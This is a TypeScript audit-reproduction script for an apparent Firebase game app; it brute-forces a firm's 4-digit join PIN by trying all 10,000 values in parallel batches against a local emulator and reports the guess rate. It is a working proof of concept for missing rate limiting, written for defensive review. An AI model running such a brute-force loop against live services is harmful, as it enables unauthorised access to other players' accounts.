/**
 * Session 9 audit reproduction (docs/REVIEW.md, PIN guessing): one anonymous client in the
 * lobby guesses a firm's 4-digit PIN by writing its own membership with every PIN in turn.
 * The rules refuse each wrong guess but cannot slow them down. Emulator only.
 *
 *   firebase emulators:exec --config firebase.test.json --only auth,database --project demo-frontier "tsx scripts/audit-pin.ts"
 *
 * The rate measured here is the local emulator's. The live database's rate was not measured
 * (the container cannot reach it).
 */
import { deleteApp, initializeApp } from 'firebase/app';
import { connectAuthEmulator, getAuth, signInAnonymously } from 'firebase/auth';
import { connectDatabaseEmulator, getDatabase, goOffline, ref, serverTimestamp, set } from 'firebase/database';
import { EMULATOR_AUTH_PORT, EMULATOR_DATABASE_PORT, EMULATOR_HOST } from '../src/firebase/config';
import { emulatorOptions } from '../src/firebase/init';
import { paths } from '../src/firebase/paths';
import { adminSet, loadRules } from './emulator-rules';

const G = 'pin-audit';
const SECRET = process.argv[2] ?? '7391';
const BATCH = Number(process.argv[3] ?? 100);

async function main(): Promise<void> {
  await loadRules();
  await adminSet(`games/${G}`, {
    meta: { code: 'PINA', title: 'PIN audit', createdAt: 1, facilitatorUid: 'fac', settings: { timerSec: 120 } },
    public: { phase: 'lobby', round: 0, paused: false, disclosure: false, T: 72, M: 0, collapsed: false, joinLocked: false, revealStep: 0 },
    firms: { victim: { name: 'Victim Labs', ticker: 'VICT', createdAt: 1, order: 0, isBot: false } },
    firmSecrets: { victim: { pin: SECRET } },
  });
  const app = initializeApp(emulatorOptions, 'pin-audit');
  const auth = getAuth(app);
  connectAuthEmulator(auth, `http://${EMULATOR_HOST}:${EMULATOR_AUTH_PORT}`, { disableWarnings: true });
  const db = getDatabase(app);
  connectDatabaseEmulator(db, EMULATOR_HOST, EMULATOR_DATABASE_PORT);
  const { user } = await signInAnonymously(auth);
  const target = ref(db, paths.member(G, user.uid));

  const t0 = Date.now();
  let tries = 0;
  let found: string | null = null;
  for (let start = 0; start < 10_000 && !found; start += BATCH) {
    const pins = Array.from({ length: Math.min(BATCH, 10_000 - start) }, (_, i) => String(start + i).padStart(4, '0'));
    const results = await Promise.all(
      pins.map((pin) =>
        set(target, { firmId: 'victim', pin, joinedAt: serverTimestamp() }).then(
          () => pin,
          () => null,
        ),
      ),
    );
    tries += pins.length;
    found = results.find((r) => r !== null) ?? null;
  }
  const s = (Date.now() - t0) / 1000;
  console.log(`PIN ${found ?? 'not found'} after ${tries} guesses in ${s.toFixed(1)} s (${Math.round(tries / s)} guesses per second, batches of ${BATCH}).`);
  console.log(`Expected time for all 10,000 PINs at this rate: ${(10_000 / (tries / s)).toFixed(0)} s.`);
  goOffline(db);
  await deleteApp(app);
  process.exit(found === SECRET ? 0 : 1);
}

main().catch((e: unknown) => {
  console.error(e);
  process.exit(1);
});
